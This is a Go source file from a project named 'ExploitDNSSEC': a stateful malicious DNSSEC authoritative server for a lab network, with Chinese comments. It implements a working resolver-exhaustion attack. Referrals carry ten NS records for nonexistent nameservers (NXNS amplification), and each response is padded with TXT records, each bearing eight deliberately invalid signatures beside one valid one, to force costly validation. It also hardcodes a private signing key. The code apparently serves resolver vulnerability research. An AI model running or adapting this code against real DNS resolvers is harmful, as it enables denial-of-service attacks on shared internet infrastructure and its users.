/**
 * @Project :   ExploitDNSSEC
 * @File    :   nxns_responser.go
 * @Contact :	tochus@163.com
 * @License :   (C)Copyright 2024
 * @Description: A stateful DNSSEC GoDNS responser implementation
 *
 * @Modify Time        @Author     @Version    @Description
 * ----------------    --------    --------    -----------
 * 01/11/24 17:10      t0chus      0.0         None
 */

package main

import (
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/tochusc/godns"
	"github.com/tochusc/godns/dns"
	"github.com/tochusc/godns/dns/xperi"
)

var TXTCountC = 2
var WrongSigCountC = 8

func main() {
	// NXNS NS 记录数量
	var nsCount = 10
	// 服务器配置
	var sConf = godns.DNSServerConfig{
		IP:            net.IPv4(10, 10, 3, 3),
		Port:          53,
		NetworkDevice: "eth0",
		MTU:           1500,
		MAC:           net.HardwareAddr{0x02, 0x42, 0x0a, 0x0a, 0x03, 0x03},
	}
	// DNSSEC 配置
	var dConf = godns.DNSSECConfig{
		DAlgo: dns.DNSSECAlgorithmECDSAP384SHA384,
		DType: dns.DNSSECDigestTypeSHA1,
	}

	// 生成 KSK 和 ZSK
	// 使用ParseKeyBase64解析预先生成的公钥，
	// 该公钥应确保能够被解析器通过 信任锚点（Trust Anchor）建立的 信任链（Chain of Trust） 所验证。
	pubKskBytes := xperi.ParseKeyBase64("MzJsFTtAo0j8qGpDIhEMnK4ImTyYwMwDPU5gt/FaXd6TOw6AvZDAj2hlhZvaxMXV6xCw1MU5iPv5ZQrb3NDLUU+TW07imJ5GD9YKi0Qiiypo+zhtL4aGaOG+870yHwuY")
	privKskBytes := xperi.ParseKeyBase64("ppaXHmb7u1jOxEzrLzuGKzbjmSLIK4gEhQOvws+cpBQyJbCwIM1Nrk4j5k94CP9e")

	trustAnchor := godns.InitTrustAnchor(
		"test",
		dConf,
		pubKskBytes,
		privKskBytes,
	)
	// 创建 GoDNS 服务器
	server := godns.GoDNSSever{
		ServerConfig: sConf,
		Sniffer: []*godns.Sniffer{
			godns.NewSniffer(godns.SnifferConfig{
				Device:   sConf.NetworkDevice,
				Port:     sConf.Port,
				PktMax:   65535,
				Protocol: godns.ProtocolUDP,
			}),
		},
		Handler: godns.NewHandler(
			sConf,
			NewNXNSResponser(
				nsCount,
				sConf,
				dConf,
				map[string]godns.DNSSECMaterial{
					"test": trustAnchor,
				},
			),
		),
	}

	// 启动 GoDNS 服务器
	server.Start()
}

var TypeBitMapsA = []byte{
	0x00, // Window Block 0
	0x01, // Bitmap Length 1
	0x40, // 0100 0000
	// Type = 0 * 256 + 1 = 1 (A)
}

type NXNSResponser struct {
	// NXNS
	NSCount         int
	RefferalSection dns.DNSResponseSection

	// 服务器配置
	ServerConf godns.DNSServerConfig

	// Stateful
	// 客户端IP -> 客户端信息的映射
	ClientMap map[string]ClientInfo

	// DNSSEC
	DNSSECConf godns.DNSSECConfig
	// 区域名与其相应 DNSSEC 材料的映射
	// 在初始化DNSSEC Responser 时很可能需要为其手动添加信任锚点
	DNSSECMap map[string]godns.DNSSECMaterial

	// 标记某个域名是否已经被查询过
	QueryedMap map[string]bool
	// 客户端是否是BIND
	isBIND bool
}

func NewNXNSResponser(nsCount int, sConf godns.DNSServerConfig,
	dConf godns.DNSSECConfig, trustAnchor map[string]godns.DNSSECMaterial) *NXNSResponser {
	// 初始化 Referral Section
	refSec := make([]dns.DNSResourceRecord, nsCount)
	for i := 0; i < nsCount; i++ {
		refSec[i] = dns.DNSResourceRecord{
			Name:  "",
			Type:  dns.DNSRRTypeNS,
			Class: dns.DNSClassIN,
			TTL:   86400,
			RDLen: 0,
			RData: &dns.DNSRDATANS{NSDNAME: fmt.Sprintf("ns.nxns%d.test", i)},
		}
	}
	return &NXNSResponser{
		NSCount:         nsCount,
		ServerConf:      sConf,
		ClientMap:       map[string]ClientInfo{},
		DNSSECConf:      dConf,
		RefferalSection: refSec,
		DNSSECMap:       trustAnchor,
		QueryedMap:      map[string]bool{},
		isBIND:          false,
	}
}

// Response 根据 DNS 查询信息生成 DNS 回复信息。
func (d *NXNSResponser) Response(qInfo godns.QueryInfo) (godns.ResponseInfo, error) {
	d.RegisterClient(qInfo)
	rInfo := godns.InitResp(qInfo)
	d.EnableDNSSEC(qInfo, &rInfo)

	// 可以在这里随意地构造回复...
	qName := qInfo.DNS.Question[0].Name
	qLabels := strings.Split(qName, ".")
	qType := qInfo.DNS.Question[0].Type

	if qType == dns.DNSRRTypeNS {
		d.isBIND = true
	}

	if qType != dns.DNSRRTypeA && qType != dns.DNSRRTypeNS {
		return rInfo, nil
	}

	// xxxx.test NS/Referral
	if len(qLabels) == 2 {
		// nxns{i}.test NS/A
		if qLabels[0][:4] == "nxns" {
			if qType == dns.DNSRRTypeNS {
				aRR := dns.DNSResourceRecord{
					Name:  qName,
					Type:  dns.DNSRRTypeNS,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: 0,
					RData: &dns.DNSRDATANS{NSDNAME: qName},
				}
				signerName := dns.GetUpperDomainName(&qName)
				sigRec := d.GenerateRRSIGRR(aRR, signerName)
				rInfo.DNS.Answer = []dns.DNSResourceRecord{aRR, sigRec}
			} else if qType == dns.DNSRRTypeA {
				aRR := dns.DNSResourceRecord{
					Name:  qName,
					Type:  dns.DNSRRTypeA,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: 0,
					RData: &dns.DNSRDATAA{Address: net.IPv4(10, 10, 3, 3)},
				}
				signerName := dns.GetUpperDomainName(&qName)
				sigRec := d.GenerateRRSIGRR(aRR, signerName)
				rInfo.DNS.Answer = []dns.DNSResourceRecord{aRR, sigRec}
			}
			rInfo.DNS.Header.RCode = dns.DNSResponseCodeNoErr
			godns.FixCount(&rInfo)

			// Additonal Test
			qSignerName := dns.GetUpperDomainName(&qName)
			dnssecMat := d.GetDNSSECMat(qSignerName)
			for i := 0; i < TXTCountC; i++ {
				txt := dns.DNSResourceRecord{
					Name:  fmt.Sprintf("txt%d.%s", i, qName),
					Type:  dns.DNSRRTypeTXT,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: 0,
					RData: &dns.DNSRDATATXT{TXT: "Test"},
				}
				rInfo.DNS.Additional = append(rInfo.DNS.Additional, txt)
				for j := 0; j < WrongSigCountC; j++ {
					sig := xperi.GenRandomRRSIG(
						[]dns.DNSResourceRecord{txt},
						dns.DNSSECAlgorithmECDSAP384SHA384,
						uint32(time.Now().UTC().Unix()+86400-3600),
						uint32(time.Now().UTC().Unix()-3600),
						uint16(dnssecMat.ZSKTag),
						qSignerName,
					)
					sigRec := dns.DNSResourceRecord{
						Name:  fmt.Sprintf("txt%d.%s", i, qName),
						Type:  dns.DNSRRTypeRRSIG,
						Class: dns.DNSClassIN,
						TTL:   86400,
						RDLen: uint16(sig.Size()),
						RData: &sig,
					}
					rInfo.DNS.Additional = append(rInfo.DNS.Additional, sigRec)
				}
				sig := xperi.GenerateRRSIG(
					[]dns.DNSResourceRecord{txt},
					dns.DNSSECAlgorithmECDSAP384SHA384,
					uint32(time.Now().UTC().Unix()+86400-3600),
					uint32(time.Now().UTC().Unix()-3600),
					uint16(dnssecMat.ZSKTag),
					qSignerName,
					dnssecMat.PrivateZSK,
				)
				sigRec := dns.DNSResourceRecord{
					Name:  fmt.Sprintf("txt%d.%s", i, qName),
					Type:  dns.DNSRRTypeRRSIG,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: uint16(sig.Size()),
					RData: &sig,
				}
				rInfo.DNS.Additional = append(rInfo.DNS.Additional, sigRec)
			}

			return rInfo, nil
		} else {
			//xxxx.test(not nxns{i}) Referral
			upperName := dns.GetUpperDomainName(&qName)
			dnssecMat := d.GetDNSSECMat(upperName)
			rInfo.DNS.Authority = d.RefferalSection
			for i := 0; i < d.NSCount; i++ {
				rInfo.DNS.Authority[i].Name = qName
			}
			nsSig := xperi.GenerateRRSIG(
				rInfo.DNS.Authority,
				d.DNSSECConf.DAlgo,
				uint32(time.Now().UTC().Unix()+86400-3600),
				uint32(time.Now().UTC().Unix()-3600),
				uint16(dnssecMat.ZSKTag),
				upperName,
				dnssecMat.PrivateZSK,
			)
			nsSigRec := dns.DNSResourceRecord{
				Name:  qName,
				Type:  dns.DNSRRTypeRRSIG,
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: uint16(nsSig.Size()),
				RData: &nsSig,
			}
			rInfo.DNS.Authority = append(rInfo.DNS.Authority, nsSigRec)

			// 修正计数
			godns.FixCount(&rInfo)
			rInfo.DNS.Header.RCode = dns.DNSResponseCodeNoErr

			// Additonal Test
			qSignerName := dns.GetUpperDomainName(&qName)
			for i := 0; i < TXTCountC; i++ {
				txt := dns.DNSResourceRecord{
					Name:  fmt.Sprintf("txt%d.%s", i, qName),
					Type:  dns.DNSRRTypeTXT,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: 0,
					RData: &dns.DNSRDATATXT{TXT: "Test"},
				}
				rInfo.DNS.Additional = append(rInfo.DNS.Additional, txt)
				for j := 0; j < WrongSigCountC; j++ {
					sig := xperi.GenRandomRRSIG(
						[]dns.DNSResourceRecord{txt},
						dns.DNSSECAlgorithmECDSAP384SHA384,
						uint32(time.Now().UTC().Unix()+86400-3600),
						uint32(time.Now().UTC().Unix()-3600),
						uint16(dnssecMat.ZSKTag),
						qSignerName,
					)
					sigRec := dns.DNSResourceRecord{
						Name:  fmt.Sprintf("txt%d.%s", i, qName),
						Type:  dns.DNSRRTypeRRSIG,
						Class: dns.DNSClassIN,
						TTL:   86400,
						RDLen: uint16(sig.Size()),
						RData: &sig,
					}
					rInfo.DNS.Additional = append(rInfo.DNS.Additional, sigRec)
				}
				sig := xperi.GenerateRRSIG(
					[]dns.DNSResourceRecord{txt},
					dns.DNSSECAlgorithmECDSAP384SHA384,
					uint32(time.Now().UTC().Unix()+86400-3600),
					uint32(time.Now().UTC().Unix()-3600),
					uint16(dnssecMat.ZSKTag),
					qSignerName,
					dnssecMat.PrivateZSK,
				)
				sigRec := dns.DNSResourceRecord{
					Name:  fmt.Sprintf("txt%d.%s", i, qName),
					Type:  dns.DNSRRTypeRRSIG,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: uint16(sig.Size()),
					RData: &sig,
				}
				rInfo.DNS.Additional = append(rInfo.DNS.Additional, sigRec)
			}

			return rInfo, nil
		}

	}
	// NXDOMAIN/NS/A
	if len(qLabels) == 3 {
		if qLabels[0] == "ns" {
			// ns.nxns{i}.test NS/A
			_, ok := d.QueryedMap[qName]
			if !ok {
				d.QueryedMap[qName] = false
			} else {
				d.QueryedMap[qName] = !d.QueryedMap[qName]
			}
			if !d.QueryedMap[qName] && !d.isBIND {
				// NS
				upperName := dns.GetUpperDomainName(&qName)
				// Authority
				nsRR := dns.DNSResourceRecord{
					Name:  qLabels[1] + "." + qLabels[2],
					Type:  dns.DNSRRTypeNS,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: 0,
					RData: &dns.DNSRDATANS{NSDNAME: upperName},
				}
				nsSig := d.GenerateRRSIGRR(nsRR, qLabels[1]+"."+qLabels[2])
				rInfo.DNS.Authority = []dns.DNSResourceRecord{nsRR, nsSig}

				// Additional
				aRR := dns.DNSResourceRecord{
					Name:  qLabels[1] + "." + qLabels[2],
					Type:  dns.DNSRRTypeA,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: 0,
					RData: &dns.DNSRDATAA{Address: net.IPv4(10, 10, 3, 3)},
				}
				aSig := d.GenerateRRSIGRR(aRR, qLabels[1]+"."+qLabels[2])
				rInfo.DNS.Additional = []dns.DNSResourceRecord{aRR, aSig}
				rInfo.DNS.Header.RCode = dns.DNSResponseCodeNoErr
			} else {
				// A
				upperName := dns.GetUpperDomainName(&qName)
				aRR := dns.DNSResourceRecord{
					Name:  qName,
					Type:  dns.DNSRRTypeA,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: 0,
					RData: &dns.DNSRDATAA{Address: net.IPv4(10, 10, 3, 3)},
				}
				aSig := d.GenerateRRSIGRR(aRR, upperName)
				rInfo.DNS.Answer = []dns.DNSResourceRecord{aRR, aSig}
				rInfo.DNS.Header.RCode = dns.DNSResponseCodeNoErr
			}
		} else {
			// xxx.xxxx.test NXDOMAIN
			upperName := dns.GetUpperDomainName(&qName)
			znRDATA := dns.DNSRDATANSEC{
				NextDomainName: "0." + upperName,
				TypeBitMaps:    TypeBitMapsA,
			}
			znRR := dns.DNSResourceRecord{
				Name:  upperName,
				Type:  dns.DNSRRTypeNSEC,
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: uint16(znRDATA.Size()),
				RData: &znRDATA,
			}
			znSig := d.GenerateRRSIGRR(znRR, upperName)
			nRDATA := dns.DNSRDATANSEC{
				NextDomainName: upperName,
				TypeBitMaps:    TypeBitMapsA,
			}
			nRR := dns.DNSResourceRecord{
				Name:  "0." + upperName,
				Type:  dns.DNSRRTypeNSEC,
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: uint16(nRDATA.Size()),
				RData: &nRDATA,
			}
			nSig := d.GenerateRRSIGRR(nRR, upperName)
			rInfo.DNS.Authority = []dns.DNSResourceRecord{znRR, znSig, nRR, nSig}
			rInfo.DNS.Header.RCode = dns.DNSResponseCodeNXDomain
		}

		// Additonal Test
		qSignerName := dns.GetUpperDomainName(&qName)
		dnssecMat := d.GetDNSSECMat(qSignerName)
		for i := 0; i < TXTCountC; i++ {
			txt := dns.DNSResourceRecord{
				Name:  fmt.Sprintf("txt%d.%s", i, qName),
				Type:  dns.DNSRRTypeTXT,
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: 0,
				RData: &dns.DNSRDATATXT{TXT: "Test"},
			}
			rInfo.DNS.Additional = append(rInfo.DNS.Additional, txt)
			for j := 0; j < WrongSigCountC; j++ {
				sig := xperi.GenRandomRRSIG(
					[]dns.DNSResourceRecord{txt},
					dns.DNSSECAlgorithmECDSAP384SHA384,
					uint32(time.Now().UTC().Unix()+86400-3600),
					uint32(time.Now().UTC().Unix()-3600),
					uint16(dnssecMat.ZSKTag),
					qSignerName,
				)
				sigRec := dns.DNSResourceRecord{
					Name:  fmt.Sprintf("txt%d.%s", i, qName),
					Type:  dns.DNSRRTypeRRSIG,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: uint16(sig.Size()),
					RData: &sig,
				}
				rInfo.DNS.Additional = append(rInfo.DNS.Additional, sigRec)
			}
			sig := xperi.GenerateRRSIG(
				[]dns.DNSResourceRecord{txt},
				dns.DNSSECAlgorithmECDSAP384SHA384,
				uint32(time.Now().UTC().Unix()+86400-3600),
				uint32(time.Now().UTC().Unix()-3600),
				uint16(dnssecMat.ZSKTag),
				qSignerName,
				dnssecMat.PrivateZSK,
			)
			sigRec := dns.DNSResourceRecord{
				Name:  fmt.Sprintf("txt%d.%s", i, qName),
				Type:  dns.DNSRRTypeRRSIG,
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: uint16(sig.Size()),
				RData: &sig,
			}
			rInfo.DNS.Additional = append(rInfo.DNS.Additional, sigRec)
		}
	}

	// 修正计数
	godns.FixCount(&rInfo)
	return rInfo, nil
}

type ClientInfo struct {
	// NXNS
	IsDirected bool
	DirectedTo string

	QueryTimes int
	QueryList  []godns.QueryInfo
}

// RegisterClient 记录客户端信息
func (d *NXNSResponser) RegisterClient(qInfo godns.QueryInfo) {
	qIP := qInfo.IP.String()
	if _, ok := d.ClientMap[qIP]; !ok {
		d.ClientMap[qIP] = ClientInfo{
			QueryTimes: 1,
			QueryList:  []godns.QueryInfo{},
		}
	} else {
		clientInfo := d.ClientMap[qIP]
		clientInfo.QueryTimes++
		clientInfo.QueryList = append(clientInfo.QueryList, qInfo)
		d.ClientMap[qIP] = clientInfo
	}
}

// EnableDNSSEC 根据查询自动添加相关的 DNSSEC 记录
func (d NXNSResponser) EnableDNSSEC(qInfo godns.QueryInfo, rInfo *godns.ResponseInfo) error {
	// 提取查询类型和查询名称
	qType := qInfo.DNS.Question[0].Type
	qName := qInfo.DNS.Question[0].Name

	if qType == dns.DNSRRTypeDNSKEY {
		// 如果查询类型为 DNSKEY，则返回相应的 DNSKEY 记录
		dnssecMat := d.GetDNSSECMat(qName)
		rInfo.DNS.Answer = append(rInfo.DNS.Answer, dnssecMat.DNSKEYRespSec...)
		rInfo.DNS.Header.RCode = dns.DNSResponseCodeNoErr
	} else if qType == dns.DNSRRTypeDS {
		// 如果查询类型为 DS，则生成 DS 记录并返回
		dnssecMat := d.GetDNSSECMat(qName)
		ds := xperi.GenerateDS(
			qName,
			*dnssecMat.DNSKEYRespSec[1].RData.(*dns.DNSRDATADNSKEY),
			d.DNSSECConf.DType,
		)

		rec := dns.DNSResourceRecord{
			Name:  qName,
			Type:  dns.DNSRRTypeDS,
			Class: dns.DNSClassIN,
			TTL:   86400,
			RDLen: uint16(ds.Size()),
			RData: &ds,
		}
		// 生成 ZSK 签名
		upperName := dns.GetUpperDomainName(&qName)
		dnssecMat = d.GetDNSSECMat(upperName)

		sig := xperi.GenerateRRSIG(
			[]dns.DNSResourceRecord{rec},
			d.DNSSECConf.DAlgo,
			uint32(time.Now().UTC().Unix()+86400-3600),
			uint32(time.Now().UTC().Unix()-3600),
			uint16(dnssecMat.ZSKTag),
			upperName,
			dnssecMat.PrivateZSK,
		)
		sigRec := dns.DNSResourceRecord{
			Name:  qName,
			Type:  dns.DNSRRTypeRRSIG,
			Class: dns.DNSClassIN,
			TTL:   86400,
			RDLen: uint16(sig.Size()),
			RData: &sig,
		}
		rInfo.DNS.Answer = append(rInfo.DNS.Answer, rec, sigRec)
		rInfo.DNS.Header.RCode = dns.DNSResponseCodeNoErr
	}
	godns.FixCount(rInfo)
	return nil
}

func (d NXNSResponser) CreateDNSSECMat(zoneName string) godns.DNSSECMaterial {
	pubKskRDATA, privKskBytes := xperi.GenerateDNSKEY(dns.DNSSECAlgorithmECDSAP384SHA384, dns.DNSKEYFlagSecureEntryPoint)
	pubZskRDATA, privZskBytes := xperi.GenerateDNSKEY(dns.DNSSECAlgorithmECDSAP384SHA384, dns.DNSKEYFlagZoneKey)
	pubZskRR := dns.DNSResourceRecord{
		Name:  zoneName,
		Type:  dns.DNSRRTypeDNSKEY,
		Class: dns.DNSClassIN,
		TTL:   86400,
		RDLen: uint16(pubZskRDATA.Size()),
		RData: &pubZskRDATA,
	}
	pubKskRR := dns.DNSResourceRecord{
		Name:  zoneName,
		Type:  dns.DNSRRTypeDNSKEY,
		Class: dns.DNSClassIN,
		TTL:   86400,
		RDLen: uint16(pubKskRDATA.Size()),
		RData: &pubKskRDATA,
	}

	// 生成密钥集签名
	keySetSig := xperi.GenerateRRSIG(
		[]dns.DNSResourceRecord{
			pubZskRR,
			pubKskRR,
		},
		dns.DNSSECAlgorithmECDSAP384SHA384,
		uint32(time.Now().UTC().Unix()+86400-3600),
		uint32(time.Now().UTC().Unix()-3600),
		uint16(xperi.CalculateKeyTag(pubKskRDATA)),
		zoneName,
		privKskBytes,
	)
	sigRec := dns.DNSResourceRecord{
		Name:  zoneName,
		Type:  dns.DNSRRTypeRRSIG,
		Class: dns.DNSClassIN,
		TTL:   86400,
		RDLen: uint16(keySetSig.Size()),
		RData: &keySetSig,
	}
	// 生成 DNSSEC 材料
	anSec := []dns.DNSResourceRecord{
		pubZskRR,
		pubKskRR,
		sigRec,
	}
	return godns.DNSSECMaterial{
		KSKTag:        int(xperi.CalculateKeyTag(pubKskRDATA)),
		ZSKTag:        int(xperi.CalculateKeyTag(pubZskRDATA)),
		PrivateKSK:    privKskBytes,
		PrivateZSK:    privZskBytes,
		DNSKEYRespSec: anSec,
	}
}

func (d NXNSResponser) GetDNSSECMat(zoneName string) godns.DNSSECMaterial {
	dnssecMat, ok := d.DNSSECMap[zoneName]
	if !ok {
		d.DNSSECMap[zoneName] = d.CreateDNSSECMat(zoneName)
		dnssecMat = d.DNSSECMap[zoneName]
	}
	return dnssecMat
}

func (d NXNSResponser) GenerateRRSIGRR(rr dns.DNSResourceRecord, zoneName string) dns.DNSResourceRecord {
	dnssecMat := d.GetDNSSECMat(zoneName)
	sig := xperi.GenerateRRSIG(
		[]dns.DNSResourceRecord{rr},
		d.DNSSECConf.DAlgo,
		uint32(time.Now().UTC().Unix()+86400-3600),
		uint32(time.Now().UTC().Unix()-3600),
		uint16(dnssecMat.ZSKTag),
		zoneName,
		dnssecMat.PrivateZSK,
	)
	sigRec := dns.DNSResourceRecord{
		Name:  rr.Name,
		Type:  dns.DNSRRTypeRRSIG,
		Class: dns.DNSClassIN,
		TTL:   86400,
		RDLen: uint16(sig.Size()),
		RData: &sig,
	}
	return sigRec
}
